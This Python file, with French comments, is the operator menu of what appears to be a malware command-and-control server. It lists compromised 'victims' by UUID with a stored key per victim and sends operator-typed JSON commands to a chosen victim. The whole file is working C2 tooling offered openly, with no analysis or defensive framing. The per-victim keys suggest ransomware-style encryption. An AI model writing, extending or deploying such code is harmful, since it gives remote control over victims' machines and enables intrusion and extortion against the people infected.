# server/operator_menu.py

"""
Interface opérateur très simple en ligne de commande.
Permet :
- de lister les victimes connues
- de sélectionner une victime
- d'envoyer une commande JSON simple
"""

import json
from storage import load_victims


def operator_loop(send_func):
    """
    Boucle opérateur.

    Paramètre :
        send_func(uuid: str, message: dict) -> None
        Fonction fournie par main.py pour envoyer un message
        à un client identifié par son UUID.
    """
    while True:
        print("\n=== MENU OPERATEUR ===")
        print("1) Lister les victimes")
        print("2) Envoyer une commande JSON")
        print("3) Quitter")

        choice = input("> ").strip()

        if choice == "1":
            victims = load_victims()
            if not victims:
                print("Aucune victime enregistrée.")
            else:
                for uuid, info in victims.items():
                    print(f"- {uuid} (clé: {info.get('key')})")

        elif choice == "2":
            uuid = input("UUID de la victime : ").strip()
            raw = input("Commande JSON : ").strip()

            try:
                message = json.loads(raw)
            except Exception:
                print("[ERROR] JSON invalide")
                continue

            send_func(uuid, message)

        elif choice == "3":
            print("Sortie du menu opérateur.")
            break

        else:
            print("Choix invalide.")
